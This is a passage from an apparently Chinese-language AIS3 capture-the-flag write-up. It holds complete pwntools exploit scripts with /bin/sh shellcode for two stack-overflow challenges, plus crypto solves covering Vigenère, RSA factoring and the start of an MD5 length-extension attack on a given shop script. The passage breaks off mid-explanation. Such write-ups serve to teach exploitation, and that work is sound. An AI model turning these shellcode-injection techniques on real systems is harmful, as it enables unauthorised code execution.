class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x80</span> <span class="p">]</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">shellcode_byte</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>

	<span class="n">echo_start</span> <span class="o">=</span> <span class="mh">0x08048540</span>

	<span class="c1"># leak ebp
</span>	<span class="n">payload</span> <span class="o">=</span> <span class="s">"%p."</span><span class="o">*</span><span class="mi">3</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">echo_start</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	
	<span class="c1"># calculate buffer address
</span>	<span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
	<span class="n">ret_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span> <span class="o">+</span> <span class="mi">28</span>

	<span class="c1"># return to shellcode
</span>	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">20</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="mi">10</span> <span class="o">+</span> <span class="n">shellcode</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<h2 id="pwn3d3">PWN3D3</h2>
<p>32 bit ELF, 一樣沒開 DEP</p>

<p>這是一個簡單的模擬 stack 的程式<br />
功能有 push, pop, show, exit<br />
push 的話會要你先輸入一個 integer<br />
之後程式會把這個 integer 放在 stack 上面<br />
可以透過 show 功能去查看 stack 目前長什麼樣子<br />
pop 的話會把 stack 上面的一個數字 pop 出來<br />
exit 則是離開程式</p>

<p>透過一些 fuzzing<br />
我們可以發現當 stack 上面沒東西的時候<br />
利用 pop 功能可以 leak 出一些 address，包括 ebp<br />
因此我們可以利用這個功能來計算當前 stack 的位置以及我們 input buffer 的 address<br />
至於 push 功能，我們會發現說如果我們一直 push 東西進 stack 的話<br />
最後會發生 stack overflow, 覆蓋到 return address<br />
加上沒開 DEP 的關係，因此思路跟 PWN3D2 很像<br />
先利用 pop 功能 leak 出 ebp 並算出 buffer 的 address<br />
之後利用 push 功能觸發 buffer overflow 並 return to shellcode 拿 shell</p>

<p>要注意的是它 stack 上面會存有一個 address<br />
是 exit 時拿來計算 esp 用的<br />
因此這個 address 要小心不要被修改到<br />
還有就是因為這題在蓋的時候是用 integer 在蓋<br />
因此 payload 都要轉成 integer 的形式 (注意要是 int32 )</p>

<div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">numpy</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s">"52.69.163.194"</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">3333</span>
<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>

<span class="c1"># setting 
</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
<span class="n">context</span><span class="p">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
<span class="c1">#elf = ELF(ELF_PATH)
#libc = ELF(LIBC_PATH)
</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
<span class="c1">#r = process("./pwn3")
</span>
<span class="n">shellcode_byte</span> <span class="o">=</span> <span class="p">[</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x80</span> <span class="p">]</span>

<span class="c1"># constructing shellcode data
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x90</span><span class="p">]</span> <span class="o">*</span> <span class="mi">9</span>
<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">shellcode_byte</span><span class="p">:</span>
	<span class="n">shellcode</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">cur</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">index</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
	<span class="n">now</span> <span class="o">=</span> <span class="n">index</span> <span class="o">%</span> <span class="mi">4</span>
	<span class="n">cur</span> <span class="o">|=</span> <span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">now</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">now</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
		<span class="n">payload</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">numpy</span><span class="p">.</span><span class="n">int32</span><span class="p">(</span><span class="n">cur</span><span class="p">))</span>	
		<span class="n">cur</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">def</span> <span class="nf">pop</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Top item is: "</span><span class="p">)</span>
	<span class="n">item</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
	<span class="n">n</span> <span class="o">=</span> <span class="n">numpy</span><span class="p">.</span><span class="n">int32</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">item</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">n</span>

<span class="k">def</span> <span class="nf">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">num</span><span class="p">):</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"number:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>

	<span class="n">temp</span> <span class="o">=</span> <span class="p">[]</span>

	<span class="c1"># leaking ebp
</span>	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
		<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">temp</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">pop</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
	
	<span class="c1"># calculate buffer address &amp; address for ecx
</span>	<span class="n">buf_addr</span> <span class="o">=</span> <span class="n">numpy</span><span class="p">.</span><span class="n">int32</span><span class="p">(</span><span class="n">temp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x60</span><span class="p">)</span>
	<span class="n">ecx_addr</span> <span class="o">=</span> <span class="n">numpy</span><span class="p">.</span><span class="n">int32</span><span class="p">(</span><span class="n">temp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span>
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"buffer address: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">buf_addr</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">))</span>
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ecx address: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">ecx_addr</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">))</span>

	<span class="c1"># restore stack
</span>	<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">temp</span><span class="p">):</span>
		<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>

	<span class="c1"># shellcode
</span>	<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
		<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>

	<span class="c1"># padding
</span>	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">23</span><span class="p">):</span>
		<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

	<span class="c1"># important address for ecx
</span>	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">ecx_addr</span><span class="p">)</span>

	<span class="c1"># padding
</span>	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="mi">29</span><span class="p">):</span>
		<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

	<span class="c1"># return address
</span>	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">)</span>

	<span class="c1"># invoke BOF
</span>	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>

	<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<h1 id="crypto">CRYPTO</h1>
<h2 id="crypto1">CRYPTO1</h2>
<p>給了一個 vigenere.txt，很明顯的就是要我們解 <a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher">Vigenère cipher</a>
秉持著懶人懶到底的精神<br />
直接 google “vigenere cipher decoder”，找到了一堆網站<br />
通通丟進去解，接著開始拼拼湊湊( 總不可能解完整 )<br />
最後靠著 <a href="http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx">這個</a> 還有 <a href="https://f00l.de/hacking/vigenere.php">這個</a> 推出 key 的位置在</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://ctf.ais3.org/files/thekeyofvigenerehahaha.txt
</pre></td></tr></tbody></table></code></div></div>
<p>進去之後就是 flag 了</p>

<p>flag:<code class="language-plaintext highlighter-rouge">AIS3{i_am_scared_of_you}</code></p>

<h2 id="crypto2">CRYPTO2</h2>
<p>基礎的 RSA cracking<br />
之前打 CTF 都是交給強者我隊友<br />
自己解一遍之後才發現有多不熟 XDrz</p>

<p>給了一份壓縮檔，解完之後有兩個檔案<br />
flag.enc 是經過 RSA 加密過後的 flag<br />
rsa.py 裡面則是提供了 n 和 e</p>

<p>看 n 似乎不大，可以爆出來<br />
於是開了 <a href="http://sourceforge.net/projects/yafu/">yafu</a> 開始爆 pq<br />
等待的同時順便將 n 丟進 <a href="http://factordb.com/">factordb.com</a> 試試手氣<br />
結果似乎已經有人將他解出來並丟到上面去了XD<br />
不過用 yafu 爆也是爆得出來就是了，時間差不多 100 秒左右</p>

<p>有了 p 跟 q 之後就可以利用 <a href="https://github.com/ius/rsatool">rsatool</a> 來產生 PEM encode 後的 private key<br />
openssl 指令下一下之後就可以解出 flag 了</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>openssl rsautl -in flag.enc -inkey key.pem -decrypt
</pre></td></tr></tbody></table></code></div></div>

<p>flag:<code class="language-plaintext highlighter-rouge">AIS3{rsaaaaaaaaA_orz}</code></p>

<h2 id="crypto3">CRYPTO3</h2>
<p>耗費最多心力的一題，解完之後經驗值又增加了 XD</p>

<p>給了一份 buy.py</p>
<div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">signal</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">from</span> <span class="nn">urlparse</span> <span class="kn">import</span> <span class="n">parse_qsl</span>


<span class="k">def</span> <span class="nf">md5</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
	<span class="k">global</span> <span class="n">KEY</span>
	<span class="k">return</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">KEY</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span> <span class="o">+</span> <span class="n">s</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">get_number</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
	<span class="n">num</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="n">msg</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">num</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
	<span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
		<span class="k">return</span> <span class="mi">0</span>
		
	<span class="k">return</span> <span class="n">num</span>

<span class="k">def</span> <span class="nf">pick_orange</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
	<span class="n">data</span> <span class="o">=</span> <span class="s">'num=%d&amp;price=10'</span> <span class="o">%</span> <span class="n">num</span>
	<span class="k">print</span> <span class="s">'OK, this is your order information. You can check out with this code'</span>
	<span class="k">print</span> <span class="s">'%s-----%s'</span> <span class="o">%</span> <span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">md5</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">check_out</span><span class="p">():</span>
	<span class="k">global</span> <span class="n">MONEY</span>
	<span class="n">s</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">'Input your order information: '</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
	<span class="k">if</span> <span class="s">'-----'</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
		<span class="n">data</span><span class="p">,</span> <span class="n">hmac</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'-----'</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
		<span class="k">if</span> <span class="n">md5</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="n">hmac</span><span class="p">:</span>
			<span class="n">info</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span> <span class="n">parse_qsl</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="p">)</span>
			<span class="n">num</span>   <span class="o">=</span> <span class="n">info</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'num'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
			<span class="n">price</span> <span class="o">=</span> <span class="n">info</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'price'</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>

			<span class="k">try</span><span class="p">:</span>
				<span class="n">num</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
				<span class="n">price</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">price</span><span class="p">)</span>
			<span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
				<span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
				<span class="n">price</span> <span class="o">=</span> <span class="mi">10</span>

			<span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="nb">int</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">price</span><span class="p">,</span> <span class="nb">int</span><span class="p">):</span>
				<span class="k">print</span> <span class="s">'You buy %d oranges'</span> <span class="o">%</span> <span class="n">num</span>
				<span class="k">print</span> <span class="s">'Per price of orange is $%d'</span> <span class="o">%</span> <span class="n">price</span>

				<span class="k">if</span> <span class="n">num</span> <span class="o">*</span> <span class="n">price</span> <span class="o">&gt;</span> <span class="n">MONEY</span><span class="p">:</span>
					<span class="k">print</span> <span class="s">'You are too poor'</span>
				<span class="k">else</span><span class="p">:</span>
					<span class="n">MONEY</span> <span class="o">=</span> <span class="n">MONEY</span> <span class="o">-</span> <span class="n">num</span><span class="o">*</span><span class="n">price</span>
					<span class="k">print</span> <span class="s">'OK, you bought'</span>

				<span class="k">return</span> 

	<span class="k">print</span> <span class="s">'Order information not correct'</span>



<span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
	<span class="k">global</span> <span class="n">MONEY</span><span class="p">,</span> <span class="n">FLAG</span>
	<span class="k">if</span> <span class="n">MONEY</span> <span class="o">&gt;</span> <span class="mi">1000000</span><span class="p">:</span>
		<span class="k">print</span> <span class="s">'Cong, the flag is %s'</span> <span class="o">%</span> <span class="n">FLAG</span>
		<span class="nb">exit</span><span class="p">()</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">print</span> <span class="s">'Oh no, you are too poor'</span>

<span class="k">def</span> <span class="nf">show_money</span><span class="p">():</span>
	<span class="k">global</span> <span class="n">MONEY</span>
	<span class="k">print</span> <span class="s">'You now have $%d'</span> <span class="o">%</span> <span class="n">MONEY</span>

<span class="k">def</span> <span class="nf">motd</span><span class="p">():</span>
	<span class="k">print</span> <span class="s">'''
	-----------------------------------
	Welcome to Online Shopping Mall.
	[1] Pick oranges into shopping cart
	[2] Check out
	[3] Show money
	[4] Get flag
	[5] Exit
	-----------------------------------
	'''</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
	<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
			<span class="n">motd</span><span class="p">()</span>
			<span class="n">choice</span> <span class="o">=</span> <span class="n">get_number</span><span class="p">(</span><span class="s">'Input your choice: '</span><span class="p">)</span>
			<span class="k">if</span> 	 <span class="n">choice</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
				<span class="n">num</span> <span class="o">=</span> <span class="n">get_number</span><span class="p">(</span><span class="s">'How many oranges do you want to buy ?'</span><span class="p">)</span>
				<span class="k">if</span> <span class="n">num</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
					<span class="n">pick_orange</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
				<span class="k">else</span><span class="p">:</span>
					<span class="k">print</span> <span class="s">'What do you do ?'</span>
			<span class="k">elif</span> <span class="n">choice</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
				<span class="n">check_out</span><span class="p">()</span>
			<span class="k">elif</span> <span class="n">choice</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
				<span class="n">show_money</span><span class="p">()</span>
			<span class="k">elif</span> <span class="n">choice</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
				<span class="n">get_flag</span><span class="p">()</span>
			<span class="k">else</span><span class="p">:</span>
				<span class="k">print</span> <span class="s">'bye'</span>
				<span class="k">break</span>

<span class="k">def</span> <span class="nf">challenge</span><span class="p">():</span>
	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/dev/urandom'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
		<span class="n">rand</span> <span class="o">=</span> <span class="n">fp</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>

	<span class="k">print</span> <span class="s">'challenge: 0x%s'</span> <span class="o">%</span> <span class="n">rand</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
	<span class="n">res</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">'Enter response: '</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>

	<span class="k">if</span> <span class="ow">not</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span> <span class="n">rand</span> <span class="o">+</span> <span class="n">res</span> <span class="p">).</span><span class="n">hexdigest</span><span class="p">().</span><span class="n">startswith</span><span class="p">(</span><span class="s">'fffff'</span><span class="p">):</span>
		<span class="k">print</span> <span class="s">'Challenge failed'</span>
		<span class="nb">exit</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">alarm</span><span class="p">():</span>
	<span class="k">def</span> <span class="nf">handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
		<span class="k">print</span> <span class="s">'Timeout!'</span>
		<span class="nb">exit</span><span class="p">()</span>
	<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="n">handler</span><span class="p">)</span>
	<span class="n">signal</span><span class="p">.</span><span class="n">alarm</span><span class="p">(</span> <span class="mi">30</span> <span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">fdopen</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="s">'w'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
	<span class="n">sys</span><span class="p">.</span><span class="n">stdin</span>  <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">fdopen</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="s">'r'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>



	<span class="n">sys</span><span class="p">.</span><span class="n">dont_write_bytecode</span> <span class="o">=</span> <span class="bp">True</span>
	<span class="kn">from</span> <span class="nn">conf</span> <span class="kn">import</span> <span class="n">KEY</span><span class="p">,</span> <span class="n">FLAG</span><span class="p">,</span> <span class="n">MONEY</span>


	<span class="k">try</span><span class="p">:</span>
		<span class="n">challenge</span><span class="p">()</span>
		<span class="n">alarm</span><span class="p">()</span>
		<span class="n">main</span><span class="p">()</span>
	<span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
		<span class="k">pass</span>

</pre></td></tr></tbody></table></code></div></div>
<p>看懂之後有兩個重點:</p>
<ol>
  <li>利用他給的 challenge 爆 md5, 先過第一關</li>
  <li>開始買橘子，買完之後錢要 &gt; 1000000 來拿 flag</li>
</ol>

<p>第一關還好，寫個 script 爆一下就 ok 了<br />
重點是第二關<br />
買橘子在 check out 的時候會要先給它一個 order information<br />
形式為: <code class="language-plaintext highlighter-rouge">"num=XXX&amp;price=XXX-----[md5 hash]"</code><br />
其中 md5 hash 那邊是指 <code class="language-plaintext highlighter-rouge">"num=XXX&amp;price=XXX"</code> 的 md5 hash</p>

<p>程式會將 <code class="language-plaintext highlighter-rouge">-----</code> 之前的字串視為 data, 之後的字串 ( 就是 md5 hash ) 視為 hmac<br />
我們輸入 order information 的時候，程式會先做以下檢查<br />
<code class="language-plaintext highlighter-rouge">md5(key[:16]+data) == hmac</code> ( key 未知 )<br />
通過的話才會讓我們 check out (正式扣錢，買到橘子)</p>

<p>問題在於我們一開始的錢是 100 塊<br />
理論上不管怎麼買都不可能買到 1000000<br />
手上握有的資訊就只有 <code class="language-plaintext highlighter-rouge">"num=XXX&amp;price=10"</code> ( XXX 可控 ) 和其 md5 hash 值<br />
因此在這裡卡了一段時間</p>

<p>之後才發現有個 attack 叫做 Length Extension Attack (LEA)<br />
詳情可參考 <a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks">這篇</a> 和 <a href="http://ddaa.logdown.com/posts/194524-plaid-ctf-2014-crypto-250-parlor">這篇</a>
簡單來說就是如果我有辦法知道 <code class="language-plaintext highlighter-rouge">md5(a)</code> 的值<br />
